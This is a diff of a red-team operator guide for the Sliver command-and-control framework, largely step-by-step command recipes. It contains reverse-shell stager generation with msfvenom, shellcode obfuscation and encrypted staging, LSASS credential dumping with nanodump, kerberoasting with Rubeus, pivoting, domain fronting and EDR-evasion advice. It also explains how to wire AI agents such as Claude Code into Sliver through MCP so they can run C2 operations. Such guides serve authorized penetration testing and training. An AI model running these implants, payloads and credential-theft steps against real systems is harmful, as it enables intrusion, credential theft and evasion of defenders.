@@ -1,19 +1,17 @@
 ---
 tags: [redteam, c2, sliver, cheatsheet, guide]
-date: 2026-04-22
+date: 2026-05-02
 author: clawd
+version: v1.7.3
 ---
 
 # Sliver C2 — Red Team Operator Guide
 
+> [!info] Version
+> This guide covers **Sliver v1.7.3** (released Feb 2026). Commands and features are verified against official docs at [sliver.sh/docs](https://sliver.sh/docs).
+
 > [!danger] Disclaimer
 > This guide is for **authorized lab practice and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain written permission before conducting any red team engagement or penetration test. The authors assume no liability for misuse.
-
-> [!info] Related Guides
-> This guide is part of the **Cyber Exercise** vault. See also:
-> - [[Network Enumeration Guide]] — systematic recon and enumeration procedures
-> - [[Metasploit 101]] — exploitation framework for initial access and post-exploitation
-> - [[Red Team Engagement Guide]] — full engagement lifecycle and methodology
 
 ---
 
@@ -32,6 +30,11 @@ author: clawd
 | Multiple protocols | HTTP(S), DNS, WireGuard, mTLS, named pipes |
 | Beacon + Session | Flexible real-time and asynchronous C2 |
 | DNAT/redirector support | Built for operational infrastructure |
+| Stagers | Metasploit-compatible staging protocol (TCP/HTTP/HTTPS) |
+| Loot store | Server-side file/credential storage shared across operators |
+| Watchtower | Automated VT & X-Force implant hash monitoring |
+| MCP support | Model Context Protocol for AI agent integration |
+| External builders | Offload implant builds to other systems for performance or platform support |
 | Active development | Regular updates, modern codebase (Go) |
 
 ### Architecture
@@ -66,15 +69,18 @@ author: clawd
 ### Server Install
 
 ```bash
-# Official install script (Linux/macOS)
-curl -sL https://sliver.sh/install | bash
+# Official one-liner (Linux — requires root for systemd service setup)
+curl https://sliver.sh/install | sudo bash
+
+# Or just download the server binary directly (no root needed)
+# https://github.com/BishopFox/sliver/releases
 
 # Or via Go install
 go install github.com/bishopfox/sliver/server/cmd/sliver-server@latest
-
-# Or download binary from GitHub releases
-# https://github.com/BishopFox/sliver/releases
 ```
+
+> [!tip] Linux Strongly Recommended
+> The Sliver server runs best on Linux (or macOS). Some features are harder to get working on a Windows server. Operators can use any platform to connect.
 
 ### Starting the Server
 
@@ -97,32 +103,55 @@ sliver-server daemon
 ### Client Setup
 
 ```bash
-# Install the client
-curl -sL https://sliver.sh/install | bash
+# Install the client (same binary)
+curl https://sliver.sh/install | sudo bash
 
-# Generate a client config from the server
-sliver-server operator --name agustin --lhost <SERVER_IP> --save /path/to/
-
-# This creates a ~/.sliver-client/<name>.cfg file
-# Copy it to your operator machine
-
-# Connect to the server
-sliver import <name>.cfg      # Import the config
-sliver                         # Connect using imported config
+# Or download from GitHub releases:
+# https://github.com/BishopFox/sliver/releases
 ```
 
-### Generating Configs
+> [!tip] Multiplayer Mode (Recommended)
+> For most engagements, use Sliver's **multiplayer mode** — the server listens for operator connections, and operators connect from their machines with config files. Client configs are stored in `~/.sliver-client/configs/`.
+
+### Multiplayer Mode
+
+Multiplayer mode allows multiple operators to collaborate on the same server. The server exposes the operator-facing listener over gRPC/mTLS with an optional WireGuard wrapper.
 
 ```bash
-# On the server, generate configs for additional operators
-sliver-server operator --name operator2 --lhost 10.10.10.10 --save ./configs/
+# On the server console, enable multiplayer and generate operator configs:
+[server] sliver > multiplayer
 
-# For WireGuard-based multiplayer
-sliver-server operator --name wg-op --lhost 10.10.10.10 --lport 1338 --save ./configs/
+[*] Multiplayer mode enabled!
+
+[server] sliver > new-operator --name agustin --lhost <SERVER_IP> --permissions all
+
+[*] Generating new client certificate, please wait ...
+[*] Saved new client config to: /path/to/agustin_<host>.cfg
 ```
 
+```bash
+# Operators import and connect:
+sliver-client import ./agustin_<host>.cfg
+sliver-client
+# Interactive prompt to select server
+```
+
+**Multiplayer Modes:**
+
+| Mode | Flag | Port | Description |
+|------|------|------|-------------|
+| **Direct mTLS** | `--enable-wg` | TCP/31337 | Operator connects directly over gRPC/mTLS |
+| **WireGuard wrapper** | default | UDP/31337 | gRPC/mTLS tunneled inside WireGuard (more secure) |
+| **Tailscale** | `multiplayer -T` | Tailscale | Multiplayer only accessible via Tailscale tailnet |
+
+> [!tip] Daemon Mode
+> If the server runs as a daemon, generate operators via CLI:
+> ```bash
+> sliver-server operator --name agustin --lhost <SERVER_IP> --permissions all --save agustin.cfg
+> ```
+
 > [!warning] Config Security
-> Operator configs contain mTLS certificates. Treat them like private keys — never commit to version control, never transmit over unencrypted channels.
+> Operator configs contain mTLS certificates (and optionally WireGuard keys). Treat them like private keys — never commit to version control, never transmit over unencrypted channels.
 
 ---
 
@@ -202,6 +231,219 @@ jobs
 # Kill a job
 jobs kill <job-id>
 ```
+
+### Profiles
+
+Profiles are reusable implant configurations — they predefine transport, format, and other options so you don't have to type them every time.
+
+```sliver
+profiles new --name windows-http --http <SERVER_IP> --format exe
+profiles new --name linux-dns --dns <SERVER_IP> --format elf
+profiles new --name stealth-beacon --http <SERVER_IP> --beacon 120 --format shellcode
+```
+
+### Stagers 🔥
+
+Stagers allow you to deliver large implants (~10MB) via a small initial stager that downloads the full payload. Sliver supports the Meterpreter staging protocol over TCP, HTTP, and HTTPS.
+
+**Architecture:**
+1. **Profile** — Create an implant profile (usually shellcode format)
+2. **stage-listener** — Serve the payload on a staging URL
+3. **Stager** — Generated by `msfvenom`, Sliver's `generate stager`, or custom code
+
+```sliver
+# 1. Create a shellcode profile
+profiles new --name win-stage --http 10.10.10.10 --format shellcode win-stage
+
+# 2. Start the staging listener linked to the profile
+stage-listener --url http://10.10.10.10:1234 --profile win-stage
+
+[*] No builds found for profile win-stage, generating a new one
+[*] Job 1 (tcp) started
+
+# 3. Generate a stager with msfvenom
+# HTTP stager:
+msfvenom --payload windows/x64/custom/reverse_winhttp \
+  LHOST=10.10.10.10 LPORT=1234 LURI=/test.woff \
+  --format raw --out /tmp/stager.bin
+
+# TCP stager (requires --prepend-size on listener):
+stage-listener --url tcp://10.10.10.10:1234 --profile win-stage --prepend-size
+msfvenom --payload windows/x64/custom/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=1234 --format raw --out /tmp/stager.bin
+```
+
+**Shellcode Tuning Options (profiles new):**
+
+| Flag | Description | Platforms |
+|------|-------------|-----------|
+| `--shellcode-compress` | aPLib compression | Windows, macOS, Linux |
+| `--shellcode-entropy` | 1=none, 2=random names, 3=random+encrypt | Windows only |
+| `--shellcode-exitopt` | 1=exit thread, 2=exit process, 3=block | Windows only |
+| `--shellcode-bypass` | 1=none, 2=abort, 3=continue on failure | Windows only |
+| `--shellcode-headers` | 1=overwrite, 2=keep PE headers | Windows only |
+| `--shellcode-thread` | Run entry as new thread | Windows only |
+| `--shellcode-encoder` | Optional encoder (see `shellcode-encoders`) | Windows |
+| `--shellcode-oep` | Override original entry point (0=default) | Windows only |
+
+**Encrypted Staging:**
+
+```sliver
+stage-listener --url http://10.10.10.10:80 --profile win-stage \
+  --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
+```
+
+> [!tip] Custom Stagers
+> The default URL extension for stage retrieval is `.woff`. Custom stagers must request `http://SERVER:PORT/<anything>.woff`. This can be configured via the `stager_file_ext` C2 setting.
+
+### Loot System
+
+The `loot` command provides a **server-side store** for looted files and credentials shared across all operators in multiplayer mode.
+
+```sliver
+# Pull a file directly from a remote system to the loot store
+loot remote
+
+# Add a file from your local machine to the loot store
+loot local
+
+# View/fetch loot
+loot fetch     # Interactive menu to browse and retrieve loot
+
+# Remove loot from the server
+loot rm
+```
+
+> [!tip] Auto-Loot
+> Several commands (`sideload`, `execute-assembly`) have a `--loot` flag that automatically saves their output to the loot store.
+
+### Watchtower 🔍
+
+The Sliver server can periodically monitor VirusTotal and IBM X-Force for your implant hashes — alerting you if a build has been uploaded.
+
+**Setup:** Add your API keys to `~/.sliver/configs/server.json`:
+
+```json
+{
+  "watch_tower": {
+    "vt_api_key": "YOUR_VIRUSTOTAL_API_KEY",
+    "xforce_api_key": "YOUR_XFORCE_API_KEY",
+    "xforce_api_password": "YOUR_XFORCE_API_PASSWORD"
+  }
+}
+```
+
+```sliver
+# Start/stop monitoring
+monitor start
+monitor stop
+```
+
+> [!info] Rate Limits
+> Sliver respects free-tier limits: 4 req/min / 500 req/day for VirusTotal, 6 req/hour for X-Force.
+
+### MCP (Model Context Protocol) 🤖
+
+Sliver supports MCP for connecting AI models (Claude, OpenAI Codex, etc.) to Sliver operations. MCP is experimental — not all functionality is supported yet.
+
+**STDIO Mode (Recommended — uses multiplayer):**
+
+```
+# OpenAI Codex config:
+[mcp_servers.sliver]
+args = ["mcp", "--config", "/path/to/multiplayer.cfg"]
+command = "/path/to/sliver-client"
+
+# Claude Code:
+claude mcp add sliver -- /path/to/sliver-client mcp --config /path/to/multiplayer.cfg
+```
+
+**HTTP/SSE Mode:**
+
+```sliver
+sliver > mcp
+Status: stopped
+Transport: sse
+Listen: 127.0.0.1:8080
+Endpoint: http://127.0.0.1:8080/sse
+
+sliver > mcp start --transport http
+
+[*] Starting MCP server (http) on 127.0.0.1:8080
+[*] Endpoint: http://127.0.0.1:8080/mcp
+[*] Auth Header: Authorization
+[*] Auth Token: 6f90c3b3c6058fa59f570e281f3f8d39
+```
+
+> [!warning] Auto-Generated Token
+> On first HTTP/SSE use, Sliver generates a random 128-bit token in `~/.sliver-client/mcp.yaml`. Every MCP request must include this token in the `Authorization` header. If `mcp.yaml` exists, the listener only starts when the token is ≥8 chars.
+
+### C2 Advanced Options
+
+Advanced options are passed as URL-encoded parameters in the `generate` command:
+
+```sliver
+generate --http http://example.com?driver=wininet
+```
+
+**HTTP C2 Options:**
+
+| Parameter | Description | Example |
+|-----------|-------------|---------|
+| `net-timeout` | Network timeout | `?net-timeout=30s` |
+| `tls-timeout` | TLS handshake timeout | `?tls-timeout=10s` |
+| `poll-timeout` | Poll timeout | `?poll-timeout=60s` |
+| `max-errors` | Max HTTP errors before fail | `?max-errors=10` |
+| `driver` | Force HTTP driver (`wininet` on Windows) | `?driver=wininet` |
+| `force-http` | Always use plaintext HTTP | `?force-http=true` |
+| `disable-accept-header` | Disable Accept header | `?disable-accept-header=true` |
+| `disable-upgrade-header` | Disable Upgrade header | `?disable-upgrade-header=true` |
+| `proxy` | HTTP proxy URI | `?proxy=http://proxy.corp:8080` |
+| `proxy-username` | Proxy username | `?proxy-username=user` |
+| `proxy-password` | Proxy password | `?proxy-password=pass` |
+| `ask-proxy-creds` | Prompt for proxy creds (wininet) | `?ask-proxy-creds=true` |
+| `host-header` | Domain fronting | `?host-header=cdn.example.com` |
+
+**DNS C2 Options:**
+
+| Parameter | Description | Example |
+|-----------|-------------|---------|
+| `timeout` | Network timeout | `?timeout=30s` |
+| `retry-wait` | Wait before retry | `?retry-wait=5s` |
+| `retry-count` | Number of retries | `?retry-count=3` |
+| `workers-per-resolver` | Worker goroutines per resolver | `?workers-per-resolver=2` |
+| `max-errors` | Max query errors | `?max-errors=10` |
+| `force-resolv-conf` | Custom resolv.conf (URL encode newlines) | `?force-resolv-conf=...` |
+| `resolvers` | Specific DNS resolvers (`+` separated) | `?resolvers=1.1.1.1+9.9.9.9` |
+
+> [!warning] Advanced Users Only
+> These options can cause broken or unexpected implant behavior. Only use them if you understand what they do.
+
+### External Builders
+
+External builders let you offload implant builds to other systems — useful for adding platform support (e.g., connecting a MacBook for macOS builds) or increasing build performance.
+
+```bash
+# On the builder machine:
+sliver-server builder -c operator-multiplayer.cfg
+
+# Builder must have a unique name (hostname by default, override with --name)
+```
+
+```sliver
+# View connected builders and their capabilities
+sliver > builders
+
+# Offload a build to an external builder
+sliver > generate --mtls localhost --os mac --arch arm64 --external-builder
+
+[*] Using external builder: macbook-pro.local
+[*] Externally generating new darwin/arm64 implant binary
+[*] Build completed in 1m19s
+```
+
+> [!tip] Implant Customization
+> You can fork Sliver, modify the implant source, compile a custom `sliver-server`, and connect it as an external builder to a mainline server. Operators generate custom implants via `generate --external-builder`.
 
 ---
 
@@ -566,10 +808,8 @@ generate --http 10.10.10.10 --mtls 10.10.10.10:4443 --dns c2.example.com ...
 ### Armory (Extensions & Packages)
 
 ```sliver
-# Update the armory index
+# Update and search the armory index
 armory update
-
-# List available packages
 armory search
 armory search <keyword>
 
@@ -577,26 +817,257 @@ armory search <keyword>
 armory install <package-name>
 
 # Common armory packages:
-armory install scatterer      # Lateral movement
-armory install chisel         # SOCKS proxy
+armory install nanodump       # LSASS credential dumping (BOF)
 armory install rubeus         # Kerberos attacks
 armory install sharphound     # BloodHound collector
-armory install nmap           # Port scanning
 armory install seatbelt       # Situational awareness
-armory install sherlock       # Privilege escalation finder
-armory install Watson         # Privilege escalation
+armory install chisel         # SOCKS proxy
+armory install Watson         # Privilege escalation finder
+armory install inline-execute-assembly  # In-process .NET execution
 
 # List installed packages
 armory installed
 
-# Run an armory extension
-# Usage varies by package — check docs
-execute-extension <package-name>
+# List all available
+armory list
+```
+
+> [!warning] Argument Escaping (`--`)
+> Alias commands have Sliver shell flags in `--help`. Sliver's shell first lexically parses all arguments, and only unnamed positional arguments are passed to the alias. Use `--` to force positional parsing:
+> ```sliver
+> seatbelt -- -group=system     # ✅ Correct — passes "-group=system" to seatbelt
+> seatbelt -group=system         # ❌ Fails — Sliver tries to parse -group as its flag
+> seatbelt '' -group=system      # ✅ Alternative — empty string tricks parser
+> ```
+
+> [!info] Server AI Access
+> Aliases/extensions used by the server-side AI agent live in:
+> - `~/.sliver/ai/aliases/<tool>/` — e.g., `alias.json` + `Rubeus.exe`
+> - `~/.sliver/ai/extensions/<tool>/` — e.g., `extension.json` + `nanodump.x64.o`
+>
+> Copy unpacked packages into these server-side paths for the AI agent to discover and execute them.
+
+> [!warning] 256-Char Argument Limit
+> Arguments to .NET assemblies and non-reflective PE extensions are limited to 256 characters (Donut loader limitation). Workaround: use `--in-process` for .NET assemblies or a BOF extension like `inline-execute-assembly`.
+
+---
+
+## 6. Common Tasks — Quick Workflow
+
+> [!tip] Use This Section When
+> You're mid-engagement and need the exact sequence of commands for common tasks. Each task is a step-by-step recipe.
+
+---
+
+### Task 1: Set Up a New Operation
+
+```sliver
+# 1. Start the server (daemon mode)
+sliver-server daemon
+
+# 2. Start multiplayer listener (server console)
+[server] sliver > multiplayer
+
+# 3. Generate operator configs for your team
+[server] sliver > new-operator --name alice --lhost 1.2.3.4 --permissions all
+[server] sliver > new-operator --name bob --lhost 1.2.3.4 --permissions all
+
+# 4. Distribute .cfg files securely to operators
+# Operators import: sliver-client import alice_1.2.3.4.cfg
 ```
 
 ---
 
-## 6. Cheat Sheet
+### Task 2: Generate Your First Implant
+
+```sliver
+# 1. Create a profile (reusable config)
+profiles new --name win-https-beacon \
+  --https 1.2.3.4 --mtls 1.2.3.4:4443 \
+  --beacon 60 --jitter 20 --format exe --arch amd64
+
+# 2. Generate the implant from the profile
+profiles generate --name win-https-beacon
+
+# 3. Check output
+implants
+# Output: ~/.sliver/outputs/win-https-beacon.exe
+```
+
+---
+
+### Task 3: Start Listeners
+
+```sliver
+# Start multiple listeners for redundancy
+http --lhost 0.0.0.0 --lport 80
+https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem
+mtls --lhost 0.0.0.0 --lport 4443
+wg --lhost 0.0.0.0 --lport 53
+
+# Verify
+jobs
+```
+
+---
+
+### Task 4: Interact with a Session
+
+```sliver
+# List and select
+sessions          # or beacons
+use 1             # or use SESSION_NAME
+
+# Basic recon
+whoami
+getuid
+getpid
+ps
+ifconfig
+netstat
+
+# File ops
+ls C:\Users
+upload ./tool.exe C:\Users\Public\tool.exe
+download C:\Users\Public\secret.txt
+
+# Execute
+shell whoami
+execute C:\Windows\System32\cmd.exe /c dir
+
+# Done? Background or kill
+background        # Keep session alive, return to menu
+kill 1            # Terminate session
+```
+
+---
+
+### Task 5: Set Up a Stager
+
+```sliver
+# 1. Create a shellcode profile
+profiles new --name win-stage \
+  --http 1.2.3.4 --format shellcode \
+  --shellcode-entropy 3 --shellcode-compress
+
+# 2. Start the staging listener
+stage-listener --url http://1.2.3.4:8080 --profile win-stage
+
+# 3. Generate stager with msfvenom (on your attack box)
+msfvenom --payload windows/x64/custom/reverse_winhttp \
+  LHOST=1.2.3.4 LPORT=8080 LURI=/test.woff \
+  --format raw --out /tmp/stager.bin
+
+# 4. Deliver stager to target and execute
+```
+
+---
+
+### Task 6: Pivot Through an Implant
+
+```sliver
+# Inside an active session:
+use 1
+
+# Option A: SOCKS5 proxy
+socks5 --bind 127.0.0.1:1080
+# Then use proxychains: proxychains nmap -sT 10.0.0.0/24
+
+# Option B: Port forward
+portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.5:22
+# Then: ssh -p 2222 user@127.0.0.1
+
+# Option C: SSH through implant
+ssh --user root --password *** 10.0.0.5
+```
+
+---
+
+### Task 7: Install & Use Armory Extensions
+
+```sliver
+# Update and find tools
+armory update
+armory search seatbelt
+
+# Install
+armory install seatbelt
+armory install nanodump
+armory install rubeus
+
+# Run (note the -- for argument escaping)
+seatbelt -- -group=system
+rubeus -- kerberoast /outfile:hashes.txt
+
+# Install all common tools at once
+armory install seatbelt rubeus sharphound nanodump chisel
+```
+
+---
+
+### Task 8: Convert Session ↔ Beacon
+
+```sliver
+# Session too noisy? Convert to beacon (asynchronous)
+session-to-beacon 1
+
+# Need real-time interaction? Convert beacon to session
+beacon-to-session ABC123
+
+# Check status
+sessions
+beacons
+```
+
+---
+
+### Task 9: Monitor Implant Detection
+
+```sliver
+# Configure watchtower (one-time server setup)
+# Edit ~/.sliver/configs/server.json:
+# {
+#   "watch_tower": {
+#     "vt_api_key": "YOUR_VT_KEY",
+#     "xforce_api_key": "YOUR_XFORCE_KEY",
+#     "xforce_api_password": "YOUR_XFORCE_PASS"
+#   }
+# }
+
+# Start monitoring
+monitor start
+
+# Check status anytime
+monitor
+```
+
+---
+
+### Task 10: Clean Up After Engagement
+
+```sliver
+# On each implant session
+rm C:\Users\Public\implant.exe
+rm /tmp/implant
+
+# Self-terminate implants
+die
+
+# Stop listeners
+jobs
+jobs kill 1
+jobs kill 2
+
+# Review loot
+loot
+
+# Remove profiles if needed
+profiles rm win-https-beacon
+```
+
+---
+
+## 7. Cheat Sheet
 
 ### Session & Beacon Commands
 
@@ -695,7 +1166,59 @@ execute-extension <package-name>
 
 ---
 
-## 7. Profiles & Implant Generation
+### Stager Commands
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| `stage-listener` | Start staging listener | `stage-listener --url http://IP:PORT --profile win-shellcode` |
+| `stage-listener --prepend-size` | TCP stager (Metasploit) | `stage-listener --url tcp://IP:PORT --profile win-shellcode --prepend-size` |
+| `profiles new --format shellcode` | Create shellcode profile | `profiles new --name win-shellcode --mtls IP --format shellcode` |
+| `shellcode-encoders` | List shellcode encoders | `shellcode-encoders` |
+
+### Loot Commands
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| `loot` | List all loot | `loot` |
+| `loot remote` | Pull file from target to loot store | `loot remote` |
+| `loot local` | Add local file to loot store | `loot local` |
+| `loot fetch` | View/download loot | `loot fetch` |
+| `loot rm` | Remove loot | `loot rm` |
+
+### Monitor & MCP Commands
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| `monitor start` | Start VT/X-Force monitoring | `monitor start` |
+| `monitor stop` | Stop monitoring | `monitor stop` |
+| `mcp` | Show MCP server status | `mcp` |
+| `mcp start` | Start MCP server | `mcp start --transport http` |
+| `mcp stop` | Stop MCP server | `mcp stop` |
+
+### Multiplayer & Builder Commands
+
+| Command | Description | Example |
+|---------|-------------|---------|
+| `multiplayer` | Start multiplayer listener | `multiplayer` |
+| `new-operator` | Generate operator config | `new-operator --name alice --lhost 1.2.3.4 --permissions all` |
+| `operators` | List connected operators | `operators` |
+| `builders` | List external builders | `builders` |
+| `generate --external-builder` | Offload build to external | `generate --mtls IP --os mac --arch arm64 --external-builder` |
+
+### C2 Advanced Options
+
+| Parameter | Description | Example |
+|-----------|-------------|---------|
+| `?driver=wininet` | Force Windows HTTP driver | `generate --http http://IP?driver=wininet` |
+| `?proxy=URI` | HTTP proxy | `generate --http http://IP?proxy=http://proxy:8080` |
+| `?host-header=HOST` | Domain fronting | `generate --http http://IP?host-header=cdn.com` |
+| `?force-http=true` | Disable HTTPS | `generate --http http://IP?force-http=true` |
+| `?resolvers=IP+IP` | Custom DNS resolvers | `generate --dns c2.com?resolvers=1.1.1.1+9.9.9.9` |
+| `?retry-count=N` | DNS retry count | `generate --dns c2.com?retry-count=3` |
+
+---
+
+## 8. Profiles & Implant Generation
 
 ### Creating Profiles
 
@@ -776,7 +1299,7 @@ generate --name update --http 10.10.10.10 --format exe
 
 ---
 
-## 8. Listener Types
+## 9. Listener Types
 
 ### Comparison Table
 
@@ -865,7 +1388,7 @@ named-pipe --name sliver_pipe
 
 ---
 
-## 9. OPSEC Considerations
+## 10. OPSEC Considerations
 
 > [!danger] Lab Only
 > The techniques below are for authorized red team engagements and lab practice. Misuse is illegal.
@@ -877,19 +1400,23 @@ named-pipe --name sliver_pipe
 | **Default implant names** | Use `--name` with blend-in names like `update` or `svchost` |
 | **Command-line artifacts** | Use `--skip-symbols` to strip debug symbols |
 | **Binary signatures** | Regenerate implants between ops; unique compile signatures |
-| **Memory artifacts** | Consider `--evasion` flag; test against target EDR |
+| **Memory artifacts** | Use `--evasion` flag; test against target EDR |
 | **Disk artifacts** | Use `rm` to clean up; avoid writing to disk when possible |
 | **Network patterns** | Vary beacon intervals with `--jitter`; use DNS or WG for stealth |
+| **Shellcode entropy** | Use `--shellcode-entropy 3` for max obfuscation (name randomize + encrypt) |
+| **Shellcode detection** | Use `--shellcode-compress` (aPLib) + `--shellcode-bypass 2` (abort on fail) |
+| **Build detection** | Monitor with `watchtower` → `monitor start` for VT/X-Force alerting |
+| **Staging exposure** | Use `--aes-encrypt-key` for encrypted stage delivery |
 
 ### Infrastructure OPSEC
 
 ```sliver
 # 1. Never expose Sliver server directly — use redirectors
 # Redirector (Nginx example):
-# server { listen 443; location / { proxy_pass http://SLIVER_IP:80; } }
+# server { listen 443 ssl; location / { proxy_pass http://SLIVER_IP:80; } }
 
-# 2. Use domain fronting (HTTPS with CDN)
-generate --https cdn.example.com --format exe
+# 2. Use domain fronting (HTTPS with CDN — use host-header advanced option)
+generate --https cdn.example.com?host-header=legitimate.cdn.com --format exe
 
 # 3. Rotate infrastructure
 # - Use multiple redirectors
@@ -952,7 +1479,7 @@ generate --name debug-implant --http 10.10.10.10 --format exe --debug
 
 ---
 
-## 10. Troubleshooting
+## 11. Troubleshooting
 
 ### Common Issues & Fixes
 
@@ -1054,7 +1581,7 @@ tail -f ~/.sliver/logs/sliver.log
 
 ---
 
-## 11. Practice Mission Scenario
+## 12. Practice Mission Scenario
 
 > [!note] Lab Exercise
 > This is a CTF-style exercise for your lab environment. Do NOT attempt on systems you don't own.
@@ -1196,7 +1723,7 @@ sliver > creds
 
 ---
 
-## Quick Reference Card
+## 13. Quick Reference Card
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -1250,10 +1777,22 @@ sliver > creds
 │  armory update            # Update index                    │
 │  armory search <term>     # Find packages                  │
 │  armory install <pkg>     # Install package                │
+│  armory list              # List all available             │
+├─────────────────────────────────────────────────────────────┤
+│ Stagers                                                     │
+│  stage-listener --url http://IP:P --profile <name>         │
+│  stage-listener --url tcp://IP:P --profile <name>          │
+│  profiles new --name <name> --format shellcode ...         │
+├─────────────────────────────────────────────────────────────┤
+│ Monitoring                                                  │
+│  mcp start --transport http  # Start MCP server            │
+│  monitor start               # Start VT/X-Force monitoring │
+│  builders                    # List external builders      │
+│  generate --external-builder # Offload build               │
 └─────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-*Guide generated by clawd 🦞 — Last updated: 2026-04-22*
-*Sliver v1.5.x — [GitHub](https://github.com/BishopFox/sliver) — [Docs](https://sliver.sh/docs)*
+*Guide generated by clawd 🦞 — Last updated: 2026-05-02*
+*Sliver v1.7.3 — [GitHub](https://github.com/BishopFox/sliver) — [Docs](https://sliver.sh/docs) — [Releases](https://github.com/BishopFox/sliver/releases)*
